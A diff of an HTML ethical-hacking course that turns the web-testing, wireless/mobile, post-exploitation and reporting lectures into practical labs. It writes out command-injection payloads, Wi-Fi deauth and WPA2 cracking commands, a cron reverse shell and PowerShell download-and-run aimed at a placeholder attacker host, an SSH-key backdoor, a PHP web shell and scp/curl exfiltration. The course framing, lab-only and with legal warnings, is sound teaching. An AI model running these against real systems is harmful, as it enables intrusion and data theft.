-                    <ul>
-                        <li><strong>Burp Suite</strong> — Proxy & scanning (gold standard)</li>
-                        <li><strong>OWASP ZAP</strong> — Free automated scanner</li>
-                        <li><strong>SQLMap</strong> — Automated SQL Injection</li>
-                        <li><strong>Gobuster / FFUF</strong> — Directory brute-forcing</li>
-                        <li><strong>Postman / Insomnia</strong> — API testing</li>
-                    </ul>
+    <h3>Impact</h3>
+    <ul>
+        <li>Session hijacking</li>
+        <li>Credential theft</li>
+        <li>Defacing websites</li>
+    </ul>
 
-                    <h2>4. Secure Development Practices</h2>
-                    <ul>
-                        <li>Input validation & sanitization</li>
-                        <li>Prepared statements for SQL</li>
-                        <li>CSRF tokens</li>
-                        <li>Content Security Policy (CSP)</li>
-                        <li>Regular dependency updates</li>
-                    </ul>
+    <h2>5. Command Injection</h2>
 
-                    <div class="box tip">
-                        <div class="box-title">✅ Pro Tip</div>
-                        Always test web applications with both automated tools and manual techniques. Many critical
-                        flaws (logic bugs, business logic flaws) are only found manually.
-                    </div>
+    <p>Occurs when user input is passed to system commands.</p>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 8.1 — Web App Testing</div>
-                        <p>Using a legal lab target (DVWA, Juice Shop, or TryHackMe Web Fundamentals room):<br>
-                            1. Perform directory brute-forcing<br>
-                            2. Test for SQL Injection<br>
-                            3. Find and exploit at least one XSS vulnerability<br>
-                            4. Document your findings</p>
-                    </div>
+    <div class="code-block">
+<pre>; ls -la
+| whoami
+&& cat /etc/passwd</pre>
+    </div>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 8.2</div>
-                        <p>Choose one OWASP Top 10 vulnerability and write a short report explaining how it works,
-                            real-world impact, and how to prevent it.</p>
-                    </div>
+    <h3>Example</h3>
+    <p>If input is:</p>
+    <div class="code-block">
+<pre>ping 127.0.0.1; whoami</pre>
+    </div>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(6)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(8)">Next Lecture →</button>
-                    </div>
-                </div>
+    <p>→ Executes extra command on server</p>
+
+    <h2>6. Authentication & Session Attacks</h2>
+
+    <ul>
+        <li>Weak passwords</li>
+        <li>No rate limiting (brute force)</li>
+        <li>Session fixation</li>
+        <li>Session hijacking</li>
+    </ul>
+
+    <div class="code-block">
+<pre>Set-Cookie: session=abc123</pre>
+    </div>
+
+    <p>If stolen → attacker becomes user.</p>
+
+    <h2>7. Directory & Endpoint Discovery</h2>
+
+    <div class="code-block">
+<pre>gobuster dir -u http://target.com -w wordlist.txt
+ffuf -u http://target.com/FUZZ -w wordlist.txt</pre>
+    </div>
+
+    <p>Find hidden:</p>
+    <ul>
+        <li>/admin</li>
+        <li>/backup</li>
+        <li>/api</li>
+    </ul>
+
+    <h2>8. API Security Testing</h2>
+
+    <p>Modern apps rely heavily on APIs.</p>
+
+    <div class="code-block">
+<pre>GET /api/users/1
+Authorization: Bearer token</pre>
+    </div>
+
+    <h3>Common Issues</h3>
+    <ul>
+        <li>IDOR (Insecure Direct Object Reference)</li>
+        <li>Missing authentication</li>
+        <li>Rate limiting issues</li>
+    </ul>
+
+    <h2>9. Testing Tools (Professional Stack)</h2>
+    <ul>
+        <li><strong>Burp Suite</strong> — Intercept & modify requests</li>
+        <li><strong>OWASP ZAP</strong> — Automated scanning</li>
+        <li><strong>SQLMap</strong> — SQL injection</li>
+        <li><strong>FFUF</strong> — Fast fuzzing</li>
+        <li><strong>Postman</strong> — API testing</li>
+    </ul>
+
+    <h2>10. Secure Development Practices</h2>
+    <ul>
+        <li>Input validation & sanitization</li>
+        <li>Use prepared statements</li>
+        <li>Implement authentication controls</li>
+        <li>Use HTTPS everywhere</li>
+        <li>Apply Content Security Policy (CSP)</li>
+    </ul>
+
+    <div class="box tip">
+        <div class="box-title">🔥 Advanced Tip</div>
+        The most critical bugs are often business logic flaws—not simple injections.
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 8.1 — Practical Testing</div>
+        <p>
+            On DVWA / Juice Shop:
+            <br>1. Intercept requests with Burp Suite
+            <br>2. Test login for SQLi
+            <br>3. Inject XSS payload
+            <br>4. Discover hidden directories
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 8.2 — Analysis</div>
+        <p>
+            Choose one vulnerability and explain:
+            <br>• How it works
+            <br>• How to exploit it
+            <br>• How to fix it
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🔥 Challenge</div>
+        <p>
+            Perform a full web app test and create a report:
+            <br>• Vulnerabilities found
+            <br>• Exploitation steps
+            <br>• Impact
+            <br>• Fixes
+        </p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(6)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(8)">Next Lecture →</button>
+    </div>
+</div>
                 <!-- ===================== LECTURE 09 ===================== -->
-                <div class="lecture" id="lec-8">
-                    <div class="lecture-tag">Lecture 09 · Advanced</div>
-                    <h1>Wireless & Mobile Hacking</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-advanced">Advanced</span>
-                        <span class="meta-badge">~75 min</span>
-                        <span class="meta-badge">Requires: Lecture 08</span>
-                    </div>
+      
+<div class="lecture" id="lec-8">
+    <div class="lecture-tag">Lecture 09 · Advanced</div>
+    <h1>Wireless & Mobile Hacking (Practical Lab)</h1>
 
-                    <h2>Wireless Networks: The Hidden Attack Surface</h2>
-                    <p>Wireless networks (Wi-Fi, Bluetooth, NFC) are often less secured than wired ones, making them
-                        prime targets for attackers. Ethical hackers must understand how to assess and secure them.</p>
+    <div class="lecture-meta">
+        <span class="meta-badge level-advanced">Advanced</span>
+        <span class="meta-badge">~75 min</span>
+        <span class="meta-badge">Requires: Lecture 08</span>
+    </div>
 
-                    <h2>1. Wi-Fi Hacking Fundamentals</h2>
+    <h2>⚠️ Lab Setup (IMPORTANT)</h2>
+    <p>
+        This is a hands-on module. You MUST use:
+    </p>
+    <ul>
+        <li>Your own Wi-Fi network OR lab environment</li>
+        <li>Kali Linux (or similar)</li>
+        <li>USB Wi-Fi adapter that supports monitor mode</li>
+    </ul>
 
-                    <h3>Wi-Fi Security Standards</h3>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Protocol</th>
-                                    <th>Security</th>
-                                    <th>Status</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>WEP</td>
-                                    <td>Very Weak</td>
-                                    <td>Broken</td>
-                                </tr>
-                                <tr>
-                                    <td>WPA</td>
-                                    <td>Weak</td>
-                                    <td>Crackable</td>
-                                </tr>
-                                <tr>
-                                    <td>WPA2</td>
-                                    <td>Strong (PSK)</td>
-                                    <td>Still widely used</td>
-                                </tr>
-                                <tr>
-                                    <td>WPA3</td>
-                                    <td>Strongest</td>
-                                    <td>Recommended</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <div class="box warning">
+        <div class="box-title">⚠️ Legal Warning</div>
+        Only test networks you own or have permission to test.
+    </div>
 
-                    <h3>Common Attacks</h3>
-                    <ul>
-                        <li><strong>WPS PIN Attack</strong> — Brute force WPS</li>
-                        <li><strong>KRACK Attack</strong> — WPA2 handshake attack</li>
-                        <li><strong>Evil Twin / Rogue AP</strong> — Fake access points</li>
-                        <li><strong>Deauthentication Attack</strong> — Force reconnection</li>
-                    </ul>
+    <h2>1. Wi-Fi Hacking Fundamentals (Practical Understanding)</h2>
 
-                    <h2>2. Tools for Wireless Attacks</h2>
-                    <div class="code-block">
-                        <div class="code-header">
-                            <div class="code-dots"><span></span><span></span><span></span></div><span
-                                class="filename">Kali Linux</span>
-                        </div>
-                        <pre>airmon-ng start wlan0
-airodump-ng wlan0mon
-aireplay-ng --deauth 10 -a AP_MAC wlan0mon
-reaver -i wlan0mon -b BSSID -vv
-wifiphisher</pre>
-                    </div>
+    <h3>What You Are Actually Attacking</h3>
+    <p>
+        In Wi-Fi attacks, you are NOT directly "hacking the router".
+        You are attacking:
+    </p>
+    <ul>
+        <li>Authentication process (handshake)</li>
+        <li>Weak passwords</li>
+        <li>Misconfigured features (WPS)</li>
+    </ul>
 
-                    <h2>3. Mobile Device Hacking</h2>
+    <div class="box">
+        <div class="box-title">🧠 Key Insight</div>
+        WPA2 is not “broken” — weak passwords are.
+    </div>
 
-                    <h3>Android Attacks</h3>
-                    <ul>
-                        <li>APK reverse engineering</li>
-                        <li>Malicious apps & sideloading</li>
-                        <li>ADB exploitation</li>
-                        <li>Frida & Objection for runtime manipulation</li>
-                    </ul>
+    <h2>2. Lab 1 — Monitor Mode & Network Discovery</h2>
 
-                    <h3>iOS Attacks</h3>
-                    <ul>
-                        <li>Jailbreaking</li>
-                        <li>IPA analysis</li>
-                        <li>Checkra1n / unc0ver exploits</li>
-                    </ul>
+    <h3>Step 1: Enable Monitor Mode</h3>
+    <div class="code-block">
+<pre>airmon-ng check kill
+airmon-ng start wlan0</pre>
+    </div>
 
-                    <h2>4. Bluetooth & NFC Attacks</h2>
-                    <ul>
-                        <li>BlueBorne vulnerability</li>
-                        <li>Bluetooth pairing attacks</li>
-                        <li>NFC relay & cloning attacks</li>
-                    </ul>
+    <p><strong>Result:</strong> wlan0 → wlan0mon</p>
 
-                    <div class="box warning">
-                        <div class="box-title">⚠️ Legal & Ethical Note</div>
-                        Wireless attacks must only be performed on networks you own or have explicit written permission
-                        to test. Unauthorized Wi-Fi hacking is illegal in most jurisdictions.
-                    </div>
+    <h3>Step 2: Scan Networks</h3>
+    <div class="code-block">
+<pre>airodump-ng wlan0mon</pre>
+    </div>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 9.1 — Wireless Assessment</div>
-                        <p>In a controlled environment (your own router):<br>
-                            1. Put your wireless card in monitor mode<br>
-                            2. Capture handshakes using Aircrack-ng suite<br>
-                            3. Attempt to crack a WPA2 password using a wordlist<br>
-                            4. Document the entire process</p>
-                    </div>
+    <h3>What to Look For</h3>
+    <ul>
+        <li>BSSID → Router MAC</li>
+        <li>Channel → Important for targeting</li>
+        <li>ENC → WPA2 / WPA3</li>
+        <li>Clients → Connected devices</li>
+    </ul>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 9.2</div>
-                        <p>Research one major wireless vulnerability (e.g., KRACK or BlueBorne) and write a one-page
-                            summary including discovery year, impact, and current mitigation.</p>
-                    </div>
+    <h3>Example Output</h3>
+    <div class="code-block">
+<pre>BSSID              CH  ENC   ESSID
+AA:BB:CC:DD:EE:FF  6   WPA2  MyWiFi</pre>
+    </div>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(7)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(9)">Next Lecture →</button>
-                    </div>
-                </div>
+    <h2>3. Lab 2 — Capturing WPA2 Handshake</h2>
+
+    <h3>Step 1: Lock onto Target</h3>
+    <div class="code-block">
+<pre>airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</pre>
+    </div>
+
+    <h3>Step 2: Force Reconnection (Deauth)</h3>
+    <div class="code-block">
+<pre>aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</pre>
+    </div>
+
+    <p>
+        This forces devices to reconnect → handshake is captured.
+    </p>
+
+    <h3>Success Indicator</h3>
+    <p><strong>"WPA handshake: AA:BB:CC..."</strong></p>
+
+    <div class="box tip">
+        <div class="box-title">💡 Tip</div>
+        No clients = no handshake. You need at least one connected device.
+    </div>
+
+    <h2>4. Lab 3 — Cracking WPA2 Password</h2>
+
+    <div class="code-block">
+<pre>aircrack-ng capture.cap -w rockyou.txt</pre>
+    </div>
+
+    <h3>What Happens</h3>
+    <ul>
+        <li>Tool compares handshake against wordlist</li>
+        <li>If password is weak → cracked</li>
+        <li>If strong → attack fails</li>
+    </ul>
+
+    <h3>Example Result</h3>
+    <div class="code-block">
+<pre>KEY FOUND! [ password123 ]</pre>
+    </div>
+
+    <h2>5. Lab 4 — WPS Attack (Fast Method)</h2>
+
+    <div class="code-block">
+<pre>reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv</pre>
+    </div>
+
+    <p>
+        WPS uses a PIN → easier to brute-force than passwords.
+    </p>
+
+    <div class="box warning">
+        <div class="box-title">⚠️ Reality</div>
+        Many modern routers disable WPS due to this vulnerability.
+    </div>
+
+    <h2>6. Evil Twin Attack (Concept + Practical)</h2>
+
+    <p>Create a fake Wi-Fi with same name → trick users.</p>
+
+    <div class="code-block">
+<pre>wifiphisher</pre>
+    </div>
+
+    <h3>Attack Flow</h3>
+    <ol>
+        <li>Create fake AP</li>
+        <li>Disconnect real users</li>
+        <li>Victim connects to fake AP</li>
+        <li>Capture credentials</li>
+    </ol>
+
+    <h2>7. Mobile Hacking (Practical Basics)</h2>
+
+    <h3>Android APK Analysis</h3>
+    <div class="code-block">
+<pre>apktool d app.apk
+jadx-gui app.apk</pre>
+    </div>
+
+    <h3>What to Look For</h3>
+    <ul>
+        <li>Hardcoded passwords</li>
+        <li>API keys</li>
+        <li>Hidden endpoints</li>
+    </ul>
+
+    <h3>Dynamic Testing (Runtime)</h3>
+    <div class="code-block">
+<pre>adb devices
+adb shell
+frida -U -n app</pre>
+    </div>
+
+    <p>
+        Allows you to inspect and manipulate app behavior live.
+    </p>
+
+    <h2>8. Bluetooth Attacks (Practical Awareness)</h2>
+
+    <div class="code-block">
+<pre>hcitool scan
+bluetoothctl</pre>
+    </div>
+
+    <h3>Example</h3>
+    <ul>
+        <li>Discover nearby devices</li>
+        <li>Attempt pairing attacks</li>
+    </ul>
+
+    <h2>9. Common Mistakes Beginners Make</h2>
+    <ul>
+        <li>No monitor mode support → nothing works</li>
+        <li>Trying WPA3 → usually not crackable</li>
+        <li>No clients → no handshake</li>
+        <li>Weak wordlists → no success</li>
+    </ul>
+
+    <div class="box">
+        <div class="box-title">🎯 Reality Check</div>
+        90% of success depends on:
+        <br>• Weak passwords
+        <br>• Misconfigurations
+        <br>• User mistakes
+    </div>
+
+    <h2>10. Defense (VERY IMPORTANT)</h2>
+    <ul>
+        <li>Use WPA3 or strong WPA2 passwords</li>
+        <li>Disable WPS</li>
+        <li>Use hidden SSID (basic protection)</li>
+        <li>Enable MAC filtering (limited security)</li>
+        <li>Monitor connected devices</li>
+    </ul>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Lab Exercise 9.1 — Full Attack Chain</div>
+        <p>
+            In your lab:
+            <br>1. Enable monitor mode
+            <br>2. Scan networks
+            <br>3. Capture handshake
+            <br>4. Attempt password cracking
+            <br>5. Document results
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Lab Exercise 9.2 — Mobile Analysis</div>
+        <p>
+            Download a test APK:
+            <br>• Decompile it
+            <br>• Find sensitive data
+            <br>• Write findings
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🔥 Challenge</div>
+        <p>
+            Simulate a real penetration test:
+            <br>• Wi-Fi recon
+            <br>• Capture handshake
+            <br>• Attempt crack
+            <br>• Analyze mobile app
+            <br>• Write full report
+        </p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(7)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(9)">Next Lecture →</button>
+    </div>
+</div>
 
                 <!-- ===================== LECTURE 10 ===================== -->
-                <div class="lecture" id="lec-9">
-                    <div class="lecture-tag">Lecture 10 · Advanced</div>
-                    <h1>Post-Exploitation & Persistence</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-advanced">Advanced</span>
-                        <span class="meta-badge">~70 min</span>
-                        <span class="meta-badge">Requires: Lecture 09</span>
-                    </div>
+            <div class="lecture" id="lec-9">
+    <div class="lecture-tag">Lecture 10 · Advanced</div>
+    <h1>Post-Exploitation & Persistence (Practical Lab)</h1>
 
-                    <h2>What is Post-Exploitation?</h2>
-                    <p>Post-Exploitation is the phase after gaining initial access. The goal is to maintain access,
-                        gather valuable information, move laterally, and achieve the objectives of the penetration test
-                        while remaining undetected.</p>
+    <div class="lecture-meta">
+        <span class="meta-badge level-advanced">Advanced</span>
+        <span class="meta-badge">~70 min</span>
+        <span class="meta-badge">Requires: Lecture 09</span>
+    </div>
 
-                    <h2>1. Situational Awareness (What You Do First)</h2>
-                    <div class="code-block">
-                        <div class="code-header">
-                            <div class="code-dots"><span></span><span></span><span></span></div><span
-                                class="filename">Meterpreter / Shell</span>
-                        </div>
-                        <pre>sysinfo
-getuid
-ifconfig / ip addr
+    <h2>⚠️ Lab Context</h2>
+    <p>
+        You already have access (shell or Meterpreter). Now your job is to:
+    </p>
+    <ul>
+        <li>Understand the system</li>
+        <li>Escalate privileges</li>
+        <li>Maintain access</li>
+        <li>Extract value</li>
+    </ul>
+
+    <div class="box">
+        <div class="box-title">🧠 Operator Mindset</div>
+        Don’t rush. First understand the system → then act.
+    </div>
+
+    <h2>1. Phase 1 — Situational Awareness (Enumeration)</h2>
+
+    <p>This is ALWAYS your first step after access.</p>
+
+    <div class="code-block">
+<pre># Basic identity
 whoami
-ps
-netstat -tuln</pre>
-                    </div>
+id
 
-                    <h2>2. Privilege Escalation</h2>
-                    <ul>
-                        <li>Kernel exploits (Dirty COW, CVE-2021-4034)</li>
-                        <li>Service misconfigurations</li>
-                        <li>Weak file permissions</li>
-                        <li>Password reuse / credential dumping</li>
-                    </ul>
+# System info
+uname -a
+hostname
 
-                    <h2>3. Persistence Techniques</h2>
+# Network
+ip addr
+netstat -tuln
 
-                    <h3>Common Methods</h3>
-                    <div class="code-block">
-                        <pre><span class="cm"># Linux</span>
-crontab -e
-echo "*/5 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /etc/crontab
+# Processes
+ps aux
 
-<span class="cm"># Windows</span>
-schtasks /create /tn "Update" /tr "powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://attacker/payload.ps1'')'" /sc minute /mo 5
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\evil.exe"</pre>
-                    </div>
+# Users
+cat /etc/passwd
+</pre>
+    </div>
 
-                    <h3>Advanced Persistence</h3>
-                    <ul>
-                        <li>SSH keys (authorized_keys)</li>
-                        <li>Web shells</li>
-                        <li>Registry Run keys (Windows)</li>
-                        <li>Kernel modules / rootkits</li>
-                    </ul>
+    <h3>What You Are Looking For</h3>
+    <ul>
+        <li>Are you root/admin?</li>
+        <li>What OS + version?</li>
+        <li>What services are running?</li>
+        <li>Other users on system?</li>
+    </ul>
 
-                    <h2>4. Lateral Movement</h2>
-                    <ul>
-                        <li>Pass-the-Hash / Pass-the-Ticket</li>
-                        <li>Pivoting through compromised hosts</li>
-                        <li>RDP, WinRM, PsExec</li>
-                        <li>SSH tunneling</li>
-                    </ul>
+    <h3>Example Insight</h3>
+    <div class="code-block">
+<pre>uid=1000(user) gid=1000(user)</pre>
+    </div>
+    <p>→ You are NOT root → privilege escalation needed</p>
 
-                    <h2>5. Data Exfiltration</h2>
-                    <div class="code-block">
-                        <pre>scp sensitive.txt user@attacker_ip:/tmp/
-curl -F "file=@data.txt" http://attacker/upload
-powershell -c "Invoke-WebRequest -Uri http://attacker/exfil -Method POST -Body (Get-Content secret.txt)"</pre>
-                    </div>
+    <h2>2. Phase 2 — Privilege Escalation (Hands-On)</h2>
 
-                    <div class="box warning">
-                        <div class="box-title">⚠️ Important</div>
-                        In a real engagement, you must strictly follow the Rules of Engagement (RoE). Never exfiltrate
-                        real sensitive data without explicit permission.
-                    </div>
+    <h3>Quick Automated Check</h3>
+    <div class="code-block">
+<pre>linpeas.sh
+</pre>
+    </div>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 10.1 — Post-Exploitation Practice</div>
-                        <p>On a vulnerable lab machine (Metasploitable / TryHackMe):<br>
-                            1. Gain initial access<br>
-                            2. Perform privilege escalation<br>
-                            3. Establish persistence (cron / scheduled task)<br>
-                            4. Demonstrate lateral movement or data collection</p>
-                    </div>
+    <h3>Manual Checks (IMPORTANT)</h3>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 10.2</div>
-                        <p>Document 3 different persistence techniques (one Linux, one Windows, one cross-platform) with
-                            commands and detection methods.</p>
-                    </div>
+    <h4>Sudo Permissions</h4>
+    <div class="code-block">
+<pre>sudo -l</pre>
+    </div>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(8)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(10)">Next Lecture →</button>
-                    </div>
-                </div>
+    <h4>Example</h4>
+    <div class="code-block">
+<pre>(ALL) NOPASSWD: /usr/bin/python</pre>
+    </div>
 
+    <p>→ You can escalate:</p>
+    <div class="code-block">
+<pre>sudo python -c 'import os; os.system("/bin/bash")'</pre>
+    </div>
+
+    <h4>SUID Files</h4>
+    <div class="code-block">
+<pre>find / -perm -4000 2>/dev/null</pre>
+    </div>
+
+    <p>Look for unusual binaries.</p>
+
+    <h4>Kernel Exploit Check</h4>
+    <div class="code-block">
+<pre>uname -r</pre>
+    </div>
+
+    <p>Search for exploit matching kernel version.</p>
+
+    <div class="box tip">
+        <div class="box-title">💡 Real Skill</div>
+        Privilege escalation is about misconfigurations—not magic exploits.
+    </div>
+
+    <h2>3. Phase 3 — Credential Hunting</h2>
+
+    <div class="code-block">
+<pre># Search for passwords
+grep -r "password" /home 2>/dev/null
+
+# Check bash history
+cat ~/.bash_history
+
+# Config files
+cat /var/www/html/config.php
+</pre>
+    </div>
+
+    <h3>Example</h3>
+    <div class="code-block">
+<pre>$db_password = "admin123";</pre>
+    </div>
+
+    <p>→ Try reuse for SSH or other services</p>
+
+    <h2>4. Phase 4 — Persistence (Maintain Access)</h2>
+
+    <h3>Method 1: Cron Job (Linux)</h3>
+    <div class="code-block">
+<pre>crontab -e
+*/5 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</pre>
+    </div>
+
+    <h3>Method 2: SSH Backdoor</h3>
+    <div class="code-block">
+<pre>mkdir -p ~/.ssh
+echo "ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys</pre>
+    </div>
+
+    <h3>Method 3: Web Shell</h3>
+    <div class="code-block">
+<pre>echo "&lt;?php system($_GET['cmd']); ?&gt;" > shell.php</pre>
+    </div>
+
+    <p>Access via browser:</p>
+    <div class="code-block">
+<pre>http://target/shell.php?cmd=whoami</pre>
+    </div>
+
+    <h3>Windows Persistence</h3>
+    <div class="code-block">
+<pre>schtasks /create /tn "Updater" /tr "evil.exe" /sc minute /mo 5
+</pre>
+    </div>
+
+    <h2>5. Phase 5 — Lateral Movement</h2>
+
+    <p>Move to other machines using stolen credentials.</p>
+
+    <div class="code-block">
+<pre>ssh user@192.168.1.20
+</pre>
+    </div>
+
+    <h3>Pivoting Example</h3>
+    <div class="code-block">
+<pre>ssh -D 9050 user@target
+</pre>
+    </div>
+
+    <p>→ Use target as proxy to access internal network</p>
+
+    <h2>6. Phase 6 — Data Collection (NOT DESTRUCTIVE)</h2>
+
+    <div class="code-block">
+<pre>ls /home
+cat /etc/shadow
+tar -czf data.tar.gz /var/www
+</pre>
+    </div>
+
+    <h3>Exfiltration (Lab Only)</h3>
+    <div class="code-block">
+<pre>scp data.tar.gz user@attacker_ip:/tmp/
+</pre>
+    </div>
+
+    <div class="box warning">
+        <div class="box-title">⚠️ Critical Rule</div>
+        Never exfiltrate real sensitive data in real environments.
+    </div>
+
+    <h2>7. Full Attack Chain Example</h2>
+
+    <ol>
+        <li>Gain shell (web exploit)</li>
+        <li>Run enumeration (whoami, uname)</li>
+        <li>Find sudo misconfig</li>
+        <li>Escalate to root</li>
+        <li>Dump credentials</li>
+        <li>Add SSH key (persistence)</li>
+        <li>Move to another machine</li>
+    </ol>
+
+    <div class="box">
+        <div class="box-title">🎯 Reality</div>
+        Real hacking is chaining small weaknesses—not one big exploit.
+    </div>
+
+    <h2>8. Detection & Defense (VERY IMPORTANT)</h2>
+
+    <ul>
+        <li>Monitor unusual cron jobs</li>
+        <li>Check SSH authorized_keys</li>
+        <li>Audit running processes</li>
+        <li>Use EDR (Endpoint Detection)</li>
+        <li>Apply least privilege principle</li>
+    </ul>
+
+    <h2>9. Common Beginner Mistakes</h2>
+    <ul>
+        <li>Skipping enumeration → missing easy escalation</li>
+        <li>Using exploits blindly</li>
+        <li>Not documenting steps</li>
+        <li>Breaking the system (too aggressive)</li>
+    </ul>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Lab 10.1 — Full Post-Exploitation</div>
+        <p>
+            On a lab machine:
+            <br>1. Gain shell
+            <br>2. Enumerate system
+            <br>3. Escalate privileges
+            <br>4. Add persistence (SSH or cron)
+            <br>5. Collect non-sensitive data
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Lab 10.2 — Analysis</div>
+        <p>
+            Document:
+            <br>• How you escalated privileges
+            <br>• What vulnerability allowed it
+            <br>• How to fix it
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🔥 Challenge</div>
+        <p>
+            Simulate a real pentest:
+            <br>• Initial access
+            <br>• Privilege escalation
+            <br>• Persistence
+            <br>• Lateral movement
+            <br>• Report everything
+        </p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(8)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(10)">Next Lecture →</button>
+    </div>
+</div>
                 <!-- ===================== LECTURE 11 ===================== -->
-                <div class="lecture" id="lec-10">
-                    <div class="lecture-tag">Lecture 11 · Advanced</div>
-                    <h1>Reporting & Legal Aspects</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-advanced">Advanced</span>
-                        <span class="meta-badge">~65 min</span>
-                        <span class="meta-badge">Requires: Lecture 10</span>
-                    </div>
+             <div class="lecture" id="lec-10">
+    <div class="lecture-tag">Lecture 11 · Advanced</div>
+    <h1>Reporting & Legal Aspects (Practical Lab)</h1>
 
-                    <h2>Why Reporting is the Most Important Phase</h2>
-                    <p>The final deliverable of any ethical hacking engagement is a **professional report**. Even the
-                        best technical work is useless if it cannot be clearly communicated to stakeholders.</p>
+    <div class="lecture-meta">
+        <span class="meta-badge level-advanced">Advanced</span>
+        <span class="meta-badge">~65 min</span>
+        <span class="meta-badge">Requires: Lecture 10</span>
+    </div>
 
-                    <h2>1. Types of Reports</h2>
-                    <ul>
-                        <li><strong>Executive Summary</strong> — For management (non-technical)</li>
-                        <li><strong>Technical Report</strong> — Detailed findings for IT/security team</li>
-                        <li><strong>Remediation Roadmap</strong> — Prioritized action plan</li>
-                    </ul>
+    <h2>🎯 Objective (What You Will Produce)</h2>
+    <p>
+        By the end of this lab, you will create a **real penetration testing report**
+        from your previous exercises (scanning, exploitation, post-exploitation).
+    </p>
 
-                    <h2>2. Structure of a Professional Pentest Report</h2>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Section</th>
-                                    <th>Content</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>1. Cover Page & NDA</td>
-                                    <td>Confidentiality notice</td>
-                                </tr>
-                                <tr>
-                                    <td>2. Executive Summary</td>
-                                    <td>High-level findings & risk rating</td>
-                                </tr>
-                                <tr>
-                                    <td>3. Methodology</td>
-                                    <td>Scope, tools, timeline</td>
-                                </tr>
-                                <tr>
-                                    <td>4. Findings</td>
-                                    <td>Each vulnerability with:<br>• Risk rating (Critical/High/Medium/Low)<br>•
-                                        Description<br>• Proof of Concept (PoC)<br>• Impact<br>• Recommendation</td>
-                                </tr>
-                                <tr>
-                                    <td>5. Conclusion & Next Steps</td>
-                                    <td>Overall risk posture</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <div class="box">
+        <div class="box-title">🧠 Reality</div>
+        Clients don’t pay for hacks — they pay for clear, actionable reports.
+    </div>
 
-                    <h2>3. Legal & Ethical Considerations</h2>
-                    <ul>
-                        <li><strong>Rules of Engagement (RoE)</strong> — Must be signed before testing</li>
-                        <li><strong>Get Out of Jail Free (GOJFF) Letter</strong> — Written authorization</li>
-                        <li><strong>Non-Disclosure Agreement (NDA)</strong></li>
-                        <li><strong>Scope Creep</strong> — Never test beyond agreed scope</li>
-                        <li><strong>Data Handling</strong> — Proper destruction of sensitive data after engagement</li>
-                    </ul>
+    <h2>1. Step-by-Step Reporting Workflow</h2>
 
-                    <h2>4. Risk Rating Methodology</h2>
-                    <p>Use CVSS v3.1 scoring + business impact to assign severity.</p>
+    <ol>
+        <li>Collect evidence (screenshots, logs, commands)</li>
+        <li>Verify vulnerability (avoid false positives)</li>
+        <li>Assess impact (what can attacker do?)</li>
+        <li>Assign severity (Critical/High/Medium/Low)</li>
+        <li>Write clear reproduction steps</li>
+        <li>Provide remediation</li>
+    </ol>
 
-                    <div class="box tip">
-                        <div class="box-title">✅ Professional Tip</div>
-                        Always include screenshots, command logs, and clear step-by-step reproduction instructions in
-                        findings. Make remediation easy for the client.
-                    </div>
+    <h2>2. Evidence Collection (VERY PRACTICAL)</h2>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 11.1 — Report Writing</div>
-                        <p>Using findings from previous lab exercises, write a professional vulnerability report for one
-                            critical finding. Include:<br>
-                            • Executive summary<br>
-                            • Detailed technical description<br>
-                            • Risk rating<br>
-                            • Proof of Concept<br>
-                            • Remediation steps</p>
-                    </div>
+    <h3>What to Capture</h3>
+    <ul>
+        <li>Terminal output</li>
+        <li>Screenshots of exploitation</li>
+        <li>Tool results (Nmap, Burp, etc.)</li>
+    </ul>
 
